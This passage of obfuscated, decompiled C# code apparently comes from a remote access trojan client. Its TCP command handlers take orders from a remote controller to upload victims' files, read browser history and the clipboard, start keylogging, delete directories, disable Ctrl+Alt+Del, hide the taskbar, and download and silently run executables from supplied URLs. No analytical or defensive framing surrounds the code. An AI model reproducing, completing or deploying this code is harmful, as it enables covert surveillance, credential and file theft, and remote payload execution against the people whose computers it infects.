						thread8.Start(Strings.Mid(text, 11, Strings.Len(text)));
						break;
					}
					case "/ENCOREFL/":
					{
						Thread thread7 = new Thread(pbJlXZ8pTWOy8a173);
						thread7.Start();
						break;
					}
					case "/ERROR/":
						try
						{
							YGfmWIyWpK114();
						}
						catch (Exception projectError9)
						{
							ProjectData.SetProjectError(projectError9);
							ProjectData.ClearProjectError();
						}
						break;
					case "/STOPUPLD/":
						try
						{
							T2G0jpvQriyo40.Flush();
							YGfmWIyWpK114();
						}
						catch (Exception projectError8)
						{
							ProjectData.SetProjectError(projectError8);
							ProjectData.ClearProjectError();
						}
						break;
					case "/UPLOADFL/":
					{
						Thread thread6 = new Thread(UOGWZi3qikE9WF174);
						thread6.Start(Strings.Mid(text, 11, Strings.Len(text)));
						break;
					}
					case "/OTHERPAK/":
					{
						Thread thread5 = new Thread(j2nRy5floQ4Ju1175);
						thread5.Start(Strings.Mid(text, 11, Strings.Len(text)));
						break;
					}
					case "/FINEUPLD/":
					{
						Thread thread4 = new Thread(YixdBoICeIfWTY176);
						thread4.Start(Strings.Mid(text, 11, Strings.Len(text)));
						break;
					}
					case "/RUNEXEFL/":
						try
						{
							string text3 = Strings.Mid(text, 11, 1);
							text = Strings.Mid(text, 12, Strings.Len(text));
							if (Operators.CompareString(text3, "1", false) == 0)
							{
								Thread thread2 = new Thread(DmezhsYqieHGJz186);
								thread2.Start(text);
							}
							else
							{
								Thread thread3 = new Thread(a5xzY0RHLOArGv187);
								thread3.Start(text);
							}
						}
						catch (Exception projectError7)
						{
							ProjectData.SetProjectError(projectError7);
							ProjectData.ClearProjectError();
						}
						break;
					case "/KILLFILE/":
						try
						{
							text = Strings.Mid(text, 11, Strings.Len(text));
							Thread thread = new Thread(reTzimqVbb119);
							thread.Start(text);
						}
						catch (Exception projectError6)
						{
							ProjectData.SetProjectError(projectError6);
							ProjectData.ClearProjectError();
						}
						break;
					case "/DIRSDELL/":
						try
						{
							text = Strings.Mid(text, 11, Strings.Len(text));
							if (((ServerComputer)PTvGBbzg8wJXkDlSAlonMk2.Computer).get_FileSystem().DirectoryExists(text))
							{
								((ServerComputer)PTvGBbzg8wJXkDlSAlonMk2.Computer).get_FileSystem().DeleteDirectory(text, (DeleteDirectoryOption)5);
							}
						}
						catch (Exception projectError5)
						{
							ProjectData.SetProjectError(projectError5);
							ProjectData.ClearProjectError();
						}
						break;
					case "/FILESIZE/":
						try
						{
							text = Strings.Mid(text, 11, Strings.Len(text));
							int num = (int)((ServerComputer)PTvGBbzg8wJXkDlSAlonMk2.Computer).get_FileSystem().GetFileInfo(text).Length;
							UCIidqfxf80.WriteLine("/FILESIZE/" + Conversions.ToString(num));
							UCIidqfxf80.Flush();
						}
						catch (Exception projectError4)
						{
							ProjectData.SetProjectError(projectError4);
							ProjectData.ClearProjectError();
						}
						break;
					case "/MAKEDIRS/":
						try
						{
							text = Strings.Mid(text, 11, Strings.Len(text));
							if (!((ServerComputer)PTvGBbzg8wJXkDlSAlonMk2.Computer).get_FileSystem().DirectoryExists(text))
							{
								((ServerComputer)PTvGBbzg8wJXkDlSAlonMk2.Computer).get_FileSystem().CreateDirectory(text);
							}
						}
						catch (Exception projectError3)
						{
							ProjectData.SetProjectError(projectError3);
							ProjectData.ClearProjectError();
						}
						break;
					case "/RENAMEFL/":
						try
						{
							string text2 = Strings.Mid(text, 11, 1);
							text = Strings.Mid(text, 12, Strings.Len(text));
							string[] array = text.Split(new char[1] { '*' });
							if (Operators.CompareString(text2, "0", false) == 0)
							{
								((ServerComputer)PTvGBbzg8wJXkDlSAlonMk2.Computer).get_FileSystem().RenameDirectory(Conversions.ToString(array.GetValue(0)), Conversions.ToString(array.GetValue(1)));
							}
							else
							{
								((ServerComputer)PTvGBbzg8wJXkDlSAlonMk2.Computer).get_FileSystem().RenameFile(Conversions.ToString(array.GetValue(0)), Conversions.ToString(array.GetValue(1)));
							}
						}
						catch (Exception projectError2)
						{
							ProjectData.SetProjectError(projectError2);
							ProjectData.ClearProjectError();
						}
						break;
					default:
						uqpHzbxjkt122(1);
						try
						{
							UCIidqfxf80.WriteLine("/FILESIZE/");
							UCIidqfxf80.Flush();
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
						}
						break;
					}
				}
			}
			catch (Exception projectError15)
			{
				ProjectData.SetProjectError(projectError15);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void method_16(object temp)
	{
		StringBuilder stringBuilder = new StringBuilder();
		StringBuilder stringBuilder2 = new StringBuilder();
		int num = 65536;
		byte[] array = new byte[0];
		short num2 = 1;
		TcpClient tcpClient = new TcpClient();
		tcpClient.Connect(LY5rdd5177, Utdb0z920dp9dRMzWd8p4d47178);
		NetworkStream stream = tcpClient.GetStream();
		StreamWriter streamWriter = new StreamWriter(stream);
		StreamReader streamReader = new StreamReader(stream);
		FileStream input = new FileStream(Conversions.ToString(temp), FileMode.Open, FileAccess.Read, FileShare.Read);
		BinaryReader binaryReader = new BinaryReader(input);
		long num3 = nWRCcpvhl6123(Conversions.ToString(temp));
		string[] array2 = (string[])NewLateBinding.LateGet(temp, (Type)null, "Split", new object[1] { "\\" }, (string[])null, (Type[])null, (bool[])null);
		checked
		{
			string text = Conversions.ToString(array2.GetValue(array2.Length - 1));
			int num5 = default(int);
			long num6 = default(long);
			if (num3 < 65536L)
			{
				binaryReader.BaseStream.Seek(0L, SeekOrigin.Begin);
				array = new byte[(int)(num3 - 1L) + 1];
				binaryReader.Read(array, 0, (int)num3);
				binaryReader.BaseStream.Seek(0L, SeekOrigin.Current);
				stringBuilder.Append("/STARTDOW/" + text + "¦" + Conversions.ToString(num3) + "*");
				int num4 = array.Length - 1;
				for (int i = 0; i <= num4; i++)
				{
					stringBuilder2.Append(array.GetValue(i)!.ToString() + " ");
				}
				stringBuilder.Append((object?)stringBuilder2);
				streamWriter.WriteLine((object?)stringBuilder);
				streamWriter.Flush();
			}
			else
			{
				num5 = (int)Math.Round(Math.Floor((double)num3 / (double)num));
				num6 = num3 - num5 * num;
				binaryReader.BaseStream.Seek(0L, SeekOrigin.Begin);
				array = new byte[num - 1 + 1];
				binaryReader.Read(array, 0, num);
				binaryReader.BaseStream.Seek(0L, SeekOrigin.Current);
				stringBuilder.Append("/STARTDOW/" + text + "¦" + Conversions.ToString(num3) + "*");
				int num7 = array.Length - 1;
				for (int j = 0; j <= num7; j++)
				{
					stringBuilder2.Append(array.GetValue(j)!.ToString() + " ");
				}
				stringBuilder.Append((object?)stringBuilder2);
				streamWriter.WriteLine((object?)stringBuilder);
				streamWriter.Flush();
			}
			string text2 = null;
			try
			{
				while (tcpClient.Connected)
				{
					text2 = streamReader.ReadLine();
					if (Operators.CompareString(text2, (string)null, false) == 0)
					{
						uqpHzbxjkt122(1);
					}
					switch (Strings.Left(text2, 10))
					{
					case "/STOPDOWN/":
						try
						{
							YGfmWIyWpK114();
						}
						catch (Exception projectError5)
						{
							ProjectData.SetProjectError(projectError5);
							ProjectData.ClearProjectError();
						}
						break;
					case "/ENCOREFL/":
						try
						{
							if (num2 != num5)
							{
								StringBuilder stringBuilder3 = new StringBuilder();
								StringBuilder stringBuilder4 = new StringBuilder();
								num2 = (short)(num2 + 1);
								array = new byte[num - 1 + 1];
								binaryReader.Read(array, 0, num);
								binaryReader.BaseStream.Seek(0L, SeekOrigin.Current);
								stringBuilder3.Append("/PAKSSEND/");
								int num8 = array.Length - 1;
								for (int k = 0; k <= num8; k++)
								{
									stringBuilder4.Append(array.GetValue(k)!.ToString() + " ");
								}
								stringBuilder3.Append((object?)stringBuilder4);
								streamWriter.WriteLine((object?)stringBuilder3);
								streamWriter.Flush();
							}
							else if (num6 > 0L)
							{
								StringBuilder stringBuilder5 = new StringBuilder();
								StringBuilder stringBuilder6 = new StringBuilder();
								array = new byte[(int)(num6 - 1L) + 1];
								binaryReader.Read(array, 0, (int)num6);
								stringBuilder5.Append("/FINEDOWN/");
								int num9 = array.Length - 1;
								for (int l = 0; l <= num9; l++)
								{
									stringBuilder6.Append(array.GetValue(l)!.ToString() + " ");
								}
								stringBuilder5.Append((object?)stringBuilder6);
								streamWriter.WriteLine((object?)stringBuilder5);
								streamWriter.Flush();
								YGfmWIyWpK114();
							}
							else
							{
								streamWriter.WriteLine("/FINEDOWN/");
								streamWriter.Flush();
								YGfmWIyWpK114();
							}
						}
						catch (Exception projectError3)
						{
							ProjectData.SetProjectError(projectError3);
							try
							{
								YGfmWIyWpK114();
								streamWriter.WriteLine("/ERROR/");
								streamWriter.Flush();
							}
							catch (Exception projectError4)
							{
								ProjectData.SetProjectError(projectError4);
								ProjectData.ClearProjectError();
							}
							ProjectData.ClearProjectError();
						}
						break;
					case "/ERROR/":
						try
						{
							YGfmWIyWpK114();
						}
						catch (Exception projectError2)
						{
							ProjectData.SetProjectError(projectError2);
							ProjectData.ClearProjectError();
						}
						break;
					default:
						try
						{
							streamWriter.WriteLine("/ERROR/");
							streamWriter.Flush();
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
						}
						break;
					case "/FINISHED/":
						tcpClient.Close();
						return;
					}
				}
			}
			catch (Exception projectError6)
			{
				ProjectData.SetProjectError(projectError6);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void Zjogqr5COKqsOd196()
	{
		string text = null;
		try
		{
			while (aAu7s6NCxj2IxRAt83.Connected)
			{
				text = streamReader_0.ReadLine();
				if (Operators.CompareString(text, (string)null, false) == 0)
				{
					uqpHzbxjkt122(1);
				}
				string text2 = Strings.Left(text, 10);
				if (Operators.CompareString(text2, "/INFOPCPC/", false) == 0)
				{
					try
					{
						Thread thread = new Thread(NCsjKzoTYbxw4N183);
						thread.Start();
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				else if (Operators.CompareString(text2, "/LASTURLS/", false) == 0)
				{
					try
					{
						VuiI20EA7d133();
						string text3 = VuiI20EA7d133();
						t3kID8CF3C2xcIew85.WriteLine("/LASTURLS/" + text3);
						t3kID8CF3C2xcIew85.Flush();
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
				else
				{
					uqpHzbxjkt122(1);
					try
					{
						t3kID8CF3C2xcIew85.WriteLine("/LASTURLS/");
						t3kID8CF3C2xcIew85.Flush();
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
				}
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
	}

	private void Lf6dNCz1fJqklG197()
	{
		//IL_0045: Unknown result type (might be due to invalid IL or missing references)
		//IL_004c: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e6: Unknown result type (might be due to invalid IL or missing references)
		//IL_0100: Unknown result type (might be due to invalid IL or missing references)
		//IL_011a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0134: Unknown result type (might be due to invalid IL or missing references)
		//IL_0159: Unknown result type (might be due to invalid IL or missing references)
		//IL_0172: Unknown result type (might be due to invalid IL or missing references)
		//IL_018b: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01bd: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d6: Unknown result type (might be due to invalid IL or missing references)
		string text = null;
		try
		{
			while (mfRWvmrHi8wh2Klh88.Connected)
			{
				text = se421qOCgAnWGlrX91.ReadLine();
				if (Operators.CompareString(text, (string)null, false) == 0)
				{
					uqpHzbxjkt122(1);
				}
				string text2 = Strings.Left(text, 10);
				if (Operators.CompareString(text2, "/SHOWMESG/", false) != 0)
				{
					continue;
				}
				qpubmg0bvD3347 = (MessageBoxIcon)0;
				m8O05B7e9NyW48 = (MessageBoxButtons)0;
				sJH7eUGPcLHV49 = null;
				cF1R1JAmmPWk50 = null;
				try
				{
					List<string> list = new List<string>();
					string[] array = text.Split(new char[1] { '*' });
					string[] array2 = array;
					foreach (string item in array2)
					{
						list.Add(item);
					}
					sJH7eUGPcLHV49 = list[1].ToString();
					cF1R1JAmmPWk50 = list[2].ToString();
					switch (list[4].ToString())
					{
					case "Q":
						qpubmg0bvD3347 = (MessageBoxIcon)32;
						break;
					case "W":
						qpubmg0bvD3347 = (MessageBoxIcon)48;
						break;
					case "I":
						qpubmg0bvD3347 = (MessageBoxIcon)64;
						break;
					case "E":
						qpubmg0bvD3347 = (MessageBoxIcon)16;
						break;
					}
					switch (list[3].ToString())
					{
					case "OK":
						m8O05B7e9NyW48 = (MessageBoxButtons)0;
						break;
					case "ARI":
						m8O05B7e9NyW48 = (MessageBoxButtons)2;
						break;
					case "YNC":
						m8O05B7e9NyW48 = (MessageBoxButtons)3;
						break;
					case "YN":
						m8O05B7e9NyW48 = (MessageBoxButtons)4;
						break;
					case "OC":
						m8O05B7e9NyW48 = (MessageBoxButtons)1;
						break;
					case "RC":
						m8O05B7e9NyW48 = (MessageBoxButtons)5;
						break;
					}
					Thread thread = new Thread(zAKus4a0uF132);
					thread.Start();
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void DI1ZryGNHDTdbt198()
	{
		string text = null;
		try
		{
			while (gRD2hdi1YTNjXHDW93.Connected)
			{
				text = ShTj4LgdhsacpMO796.ReadLine();
				if (Operators.CompareString(text, (string)null, false) == 0)
				{
					uqpHzbxjkt122(1);
				}
				switch (Strings.Left(text, 10))
				{
				case "/OPENCDCD/":
					try
					{
						Thread thread3 = new Thread(method_14);
						thread3.Start(true);
					}
					catch (Exception projectError19)
					{
						ProjectData.SetProjectError(projectError19);
						ProjectData.ClearProjectError();
					}
					break;
				case "/CLOSECDD/":
					try
					{
						Thread thread2 = new Thread(method_14);
						thread2.Start(true);
					}
					catch (Exception projectError18)
					{
						ProjectData.SetProjectError(projectError18);
						ProjectData.ClearProjectError();
					}
					break;
				case "/DESKH/":
					try
					{
						rRJfGwErO8125();
					}
					catch (Exception projectError17)
					{
						ProjectData.SetProjectError(projectError17);
						ProjectData.ClearProjectError();
					}
					break;
				case "/DESKS/":
					try
					{
						method_2();
					}
					catch (Exception projectError16)
					{
						ProjectData.SetProjectError(projectError16);
						ProjectData.ClearProjectError();
					}
					break;
				case "/STARTH/":
					try
					{
						method_3();
					}
					catch (Exception projectError15)
					{
						ProjectData.SetProjectError(projectError15);
						ProjectData.ClearProjectError();
					}
					break;
				case "/STARTS/":
					try
					{
						uR5UqMcGac126();
					}
					catch (Exception projectError14)
					{
						ProjectData.SetProjectError(projectError14);
						ProjectData.ClearProjectError();
					}
					break;
				case "/HIDETASK/":
					try
					{
						g0mF1wdBVG128();
					}
					catch (Exception projectError13)
					{
						ProjectData.SetProjectError(projectError13);
						ProjectData.ClearProjectError();
					}
					break;
				case "/SHOWTASK/":
					try
					{
						K3tdBcK0QB129();
					}
					catch (Exception projectError12)
					{
						ProjectData.SetProjectError(projectError12);
						ProjectData.ClearProjectError();
					}
					break;
				case "/FLIP/":
					try
					{
						ozvy9HIEbTbWk1GKtTouTlbU45 dm2 = OvpK5C2ZqWPvhsxHnchuOLdW46.EJDCfQKMneZToBYFuHmOajba215();
						MhEygruO81wisiM0s137(ref dm2);
						dm2.dmDisplayOrientation = koZZimRwP67[2];
						method_6(dm2);
					}
					catch (Exception projectError11)
					{
						ProjectData.SetProjectError(projectError11);
						ProjectData.ClearProjectError();
					}
					break;
				case "/UNFLIP/":
					try
					{
						ozvy9HIEbTbWk1GKtTouTlbU45 dm = OvpK5C2ZqWPvhsxHnchuOLdW46.EJDCfQKMneZToBYFuHmOajba215();
						MhEygruO81wisiM0s137(ref dm);
						dm.dmDisplayOrientation = koZZimRwP67[0];
						method_6(dm);
					}
					catch (Exception projectError10)
					{
						ProjectData.SetProjectError(projectError10);
						ProjectData.ClearProjectError();
					}
					break;
				case "/SWAPM/":
					try
					{
						SwapMouseButton(256L);
					}
					catch (Exception projectError9)
					{
						ProjectData.SetProjectError(projectError9);
						ProjectData.ClearProjectError();
					}
					break;
				case "/UNSWAPM/":
					try
					{
						SwapMouseButton(0L);
					}
					catch (Exception projectError8)
					{
						ProjectData.SetProjectError(projectError8);
						ProjectData.ClearProjectError();
					}
					break;
				case "/CADD/":
					try
					{
						oCiOKcjciFJjY9Md5140(enable: false);
					}
					catch (Exception projectError7)
					{
						ProjectData.SetProjectError(projectError7);
						ProjectData.ClearProjectError();
					}
					break;
				case "/CADE/":
					try
					{
						oCiOKcjciFJjY9Md5140(enable: true);
					}
					catch (Exception projectError6)
					{
						ProjectData.SetProjectError(projectError6);
						ProjectData.ClearProjectError();
					}
					break;
				case "/TMOFF/":
					try
					{
						kwb9lsfLyuBNAKOzUv3npGlh44.SendMessage((IntPtr)65535, 274u, (IntPtr)61808, (IntPtr)2);
					}
					catch (Exception projectError5)
					{
						ProjectData.SetProjectError(projectError5);
						ProjectData.ClearProjectError();
					}
					break;
				case "/TMON/":
					try
					{
						kwb9lsfLyuBNAKOzUv3npGlh44.SendMessage((IntPtr)65535, 274u, (IntPtr)61808, (IntPtr)(-1));
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						ProjectData.ClearProjectError();
					}
					break;
				case "/SCRSTART/":
					try
					{
						s7MyhqkTrR9HI3PL6142(start: true);
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
					break;
				case "/SCRSTOP/":
					try
					{
						s7MyhqkTrR9HI3PL6142(start: false);
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					break;
				case "/SPEAKOUT/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Thread thread = new Thread(BqYPMsz9i8TRZ6190);
						thread.Start(text);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					break;
				}
			}
		}
		catch (Exception projectError20)
		{
			ProjectData.SetProjectError(projectError20);
			ProjectData.ClearProjectError();
		}
	}

	private void NIeN4t9JqnIvSX199()
	{
		string text = null;
		try
		{
			while (tcpClient_2.Connected)
			{
				text = B8UCFjpALzSK0noL101.ReadLine();
				if (Operators.CompareString(text, (string)null, false) == 0)
				{
					uqpHzbxjkt122(1);
				}
				switch (Strings.Left(text, 10))
				{
				case "/IEVER/":
					try
					{
						RegistryKey localMachine = Registry.LocalMachine;
						RegistryKey registryKey4 = localMachine.OpenSubKey("Software\\Microsoft\\Internet Explorer");
						string text3 = registryKey4.GetValue("Version")!.ToString();
						Ll989T93vJrzf0q5100.WriteLine("/IEVERSIN/" + text3);
						Ll989T93vJrzf0q5100.Flush();
					}
					catch (Exception projectError6)
					{
						ProjectData.SetProjectError(projectError6);
						ProjectData.ClearProjectError();
					}
					break;
				case "/STRTPAGE/":
					try
					{
						RegistryKey currentUser3 = Registry.CurrentUser;
						RegistryKey registryKey3 = currentUser3.OpenSubKey("Software\\Microsoft\\Internet Explorer\\Main");
						string text2 = registryKey3.GetValue("Start Page")!.ToString();
						Ll989T93vJrzf0q5100.WriteLine("/IESTARTP/" + text2);
						Ll989T93vJrzf0q5100.Flush();
					}
					catch (Exception projectError5)
					{
						ProjectData.SetProjectError(projectError5);
						ProjectData.ClearProjectError();
					}
					break;
				case "/CHANGETL/":
					text = Strings.Mid(text, 11, Strings.Len(text));
					try
					{
						RegistryKey currentUser2 = Registry.CurrentUser;
						RegistryKey registryKey2 = currentUser2.CreateSubKey("Software\\Microsoft\\Internet Explorer\\Main");
						registryKey2.SetValue("Window Title", text, RegistryValueKind.String);
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						ProjectData.ClearProjectError();
					}
					break;
				case "/CHANGEHP/":
					text = Strings.Mid(text, 11, Strings.Len(text));
					try
					{
						RegistryKey currentUser = Registry.CurrentUser;
						RegistryKey registryKey = currentUser.CreateSubKey("Software\\Microsoft\\Internet Explorer\\Main");
						registryKey.SetValue("Start Page", text);
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
					break;
				case "/RUNSPAGE/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						if (!text.StartsWith("http://") | !text.StartsWith("https://"))
						{
							text = "http://" + text;
						}
						Process.Start(text);
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					break;
				default:
					uqpHzbxjkt122(1);
					try
					{
						Ll989T93vJrzf0q5100.WriteLine("/IESTARTP/");
						Ll989T93vJrzf0q5100.Flush();
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					break;
				}
			}
		}
		catch (Exception projectError7)
		{
			ProjectData.SetProjectError(projectError7);
			ProjectData.ClearProjectError();
		}
	}

	private void method_17()
	{
		string text = null;
		try
		{
			while (NFCnrPosVzmA1p38103.Connected)
			{
				text = rIkkl3ugU6cDddZb106.ReadLine();
				if (Operators.CompareString(text, (string)null, false) == 0)
				{
					uqpHzbxjkt122(1);
				}
				string text2 = Strings.Left(text, 10);
				if (Operators.CompareString(text2, "/CLIPBOAR/", false) == 0)
				{
					try
					{
						Vz2fN19 = null;
						Thread thread = new Thread(m9kARib6prOdMvGgS146);
						thread.SetApartmentState(ApartmentState.STA);
						thread.Start();
						thread.Join();
						KPXkL1ja60YKJn4A105.WriteLine("/CLIPBOAR/" + Vz2fN19);
						KPXkL1ja60YKJn4A105.Flush();
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				else if (Operators.CompareString(text2, "/SETCLIPB/", false) == 0)
				{
					try
					{
						Vz2fN19 = Strings.Mid(text, 11, Strings.Len(text));
						Vz2fN19 = Vz2fN19.Replace("***", "\r\n");
						Thread thread2 = new Thread(QpyYXvHrMFTHxGEy9149);
						thread2.SetApartmentState(ApartmentState.STA);
						thread2.Start();
						thread2.Join();
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
				else
				{
					uqpHzbxjkt122(1);
					try
					{
						KPXkL1ja60YKJn4A105.WriteLine("/CLIPBOAR/");
						KPXkL1ja60YKJn4A105.Flush();
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
				}
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
	}

	private void xuCgRxUhDhWFJK2NN7MvH201()
	{
		string text = null;
		checked
		{
			try
			{
				while (K1JJqeuHlGpEOGWT108.Connected)
				{
					text = QLjIvGsLwLgyg111.ReadLine();
					if (Operators.CompareString(text, (string)null, false) == 0)
					{
						uqpHzbxjkt122(1);
					}
					string text2 = Strings.Left(text, 10);
					if (Operators.CompareString(text2, "/DLARUNVS/", false) == 0)
					{
						try
						{
							List<string> list = new List<string>();
							string[] array = Strings.Mid(text, 11, Strings.Len(text)).Split(new char[1] { '/' });
							string[] array2 = array;
							foreach (string item in array2)
							{
								list.Add(item);
							}
							int index = list.Count - 1;
							string text3 = Strings.Mid(text, 11, Strings.Len(text));
							((ServerComputer)PTvGBbzg8wJXkDlSAlonMk2.Computer).get_Network().DownloadFile(text3, Environment.GetEnvironmentVariable("Temp") + "\\" + list[index].ToString(), (string)null, (string)null, false, 100000, true);
							uqpHzbxjkt122(1);
							Process.Start(Environment.GetEnvironmentVariable("Temp") + "\\" + list[index].ToString());
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
						}
					}
					else
					{
						if (Operators.CompareString(text2, "/DLARUNHD/", false) != 0)
						{
							continue;
						}
						try
						{
							List<string> list2 = new List<string>();
							string[] array3 = Strings.Mid(text, 11, Strings.Len(text)).Split(new char[1] { '/' });
							string[] array4 = array3;
							foreach (string item2 in array4)
							{
								list2.Add(item2);
							}
							int index2 = list2.Count - 1;
							string text4 = Strings.Mid(text, 11, Strings.Len(text));
							((ServerComputer)PTvGBbzg8wJXkDlSAlonMk2.Computer).get_Network().DownloadFile(text4, Environment.GetEnvironmentVariable("Temp") + "\\" + list2[index2].ToString(), (string)null, (string)null, false, 100000, true);
							uqpHzbxjkt122(1);
							Process process = new Process();
							process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
							process.StartInfo.FileName = Environment.GetEnvironmentVariable("Temp") + "\\" + list2[index2].ToString();
							process.Start();
						}
						catch (Exception projectError2)
						{
							ProjectData.SetProjectError(projectError2);
							ProjectData.ClearProjectError();
						}
					}
				}
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void ZNMNWcbX374MJvadOdR4N202()
	{
		string text = null;
		try
		{
			while (NJpL1Ycp1npDu113.Connected)
			{
				text = hmRQvBKWY4HZ2116.ReadLine();
				if (Operators.CompareString(text, (string)null, false) == 0)
				{
					uqpHzbxjkt122(1);
				}
				string text2 = Strings.Left(text, 10);
				if (Operators.CompareString(text2, "/PRINTTXT/", false) == 0)
				{
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Thread thread = new Thread(W48ok1bqoN120);
						thread.Start(text);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void method_18()
	{
		string text = null;
		checked
		{
			try
			{
				while (CfpoKfEclpg9P118.Connected)
				{
					text = rkQy82Ez4MhWk121.ReadLine();
					if (Operators.CompareString(text, (string)null, false) == 0)
					{
						uqpHzbxjkt122(1);
					}
					switch (Strings.Left(text, 10))
					{
					case "/IPREVIEW/":
						try
						{
							text = Strings.Mid(text, 11, Strings.Len(text));
							Image val = null;
							Image val2 = null;
							try
							{
								val2 = Image.FromFile(text);
								string text3 = null;
								if (val2 != null)
								{
									double num = (double)val2.get_Size().Width / (double)val2.get_Size().Height;
									double num2 = (double)val2.get_Size().Height / (double)val2.get_Size().Width;
									val = ((val2.get_Size().Width <= val2.get_Size().Height) ? val2.GetThumbnailImage((int)Math.Round(200.0 / num2), 200, (GetThumbnailImageAbort)null, default(IntPtr)) : val2.GetThumbnailImage(200, (int)Math.Round(200.0 / num), (GetThumbnailImageAbort)null, default(IntPtr)));
									MemoryStream memoryStream = new MemoryStream();
									val.Save((Stream)memoryStream, ImageFormat.get_Jpeg());
									memoryStream.Capacity = (int)memoryStream.Length;
									byte[] buffer = memoryStream.GetBuffer();
									text3 = Convert.ToBase64String(buffer);
									qR3OCggUYvwAj120.WriteLine("/IPREVIEW/" + text3);
									qR3OCggUYvwAj120.Flush();
									memoryStream.Dispose();
									memoryStream.Close();
									val2.Dispose();
								}
							}
							catch (Exception projectError5)
							{
								ProjectData.SetProjectError(projectError5);
								ProjectData.ClearProjectError();
							}
						}
						catch (Exception projectError6)
						{
							ProjectData.SetProjectError(projectError6);
							ProjectData.ClearProjectError();
						}
						break;
					case "/SEARCHSS/":
						try
						{
							text = Strings.Mid(text, 11, Strings.Len(text));
							string text2 = text;
							if (Operators.CompareString(text2, "1", false) == 0)
							{
								hqutK13 = true;
							}
							else if (Operators.CompareString(text2, "2", false) == 0)
							{
								hqutK13 = false;
								qR3OCggUYvwAj120.WriteLine("/SEARCHFL/SEARCHEND");
								qR3OCggUYvwAj120.Flush();
							}
						}
						catch (Exception projectError4)
						{
							ProjectData.SetProjectError(projectError4);
							ProjectData.ClearProjectError();
						}
						break;
					case "/LISTDRVS/":
						try
						{
							Thread thread3 = new Thread(mrbYpa26Y3OYky163);
							thread3.Start(qR3OCggUYvwAj120);
						}
						catch (Exception projectError3)
						{
							ProjectData.SetProjectError(projectError3);
							ProjectData.ClearProjectError();
						}
						break;
					case "/SEARCHFL/":
						try
						{
							text = Strings.Mid(text, 11, Strings.Len(text));
							qoKqej7nD63 = text.Split(new char[1] { '¦' });
							Thread thread2 = new Thread(ULAMoFZZXG105);
							thread2.Start(qoKqej7nD63[0]);
						}
						catch (Exception projectError2)
						{
							ProjectData.SetProjectError(projectError2);
							ProjectData.ClearProjectError();
						}
						break;
					case "/DOWNFILE/":
					{
						Thread thread = new Thread(jJW26N2Ex8c2JC171);
						thread.Start(Strings.Mid(text, 11, Strings.Len(text)));
						break;
					}
					default:
						uqpHzbxjkt122(1);
						try
						{
							qR3OCggUYvwAj120.WriteLine("/IPREVIEW/");
							qR3OCggUYvwAj120.Flush();
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
						}
						break;
					}
				}
			}
			catch (Exception projectError7)
			{
				ProjectData.SetProjectError(projectError7);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void z9SSZeRzYTVqUTEIb9YFh204()
	{
		string text = null;
		try
		{
			while (ZSVTBSW5G7UlH123.Connected)
			{
				text = oZfNZWoHVTHuH126.ReadLine();
				if (Operators.CompareString(text, (string)null, false) == 0)
				{
					uqpHzbxjkt122(1);
				}
				switch (Strings.Left(text, 10))
				{
				case "/KEYSLOGG/":
					try
					{
						Thread thread3 = new Thread(eNGP4NGermMaBn184);
						thread3.Start(false);
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						ProjectData.ClearProjectError();
					}
					break;
				case "/KEYSLOGR/":
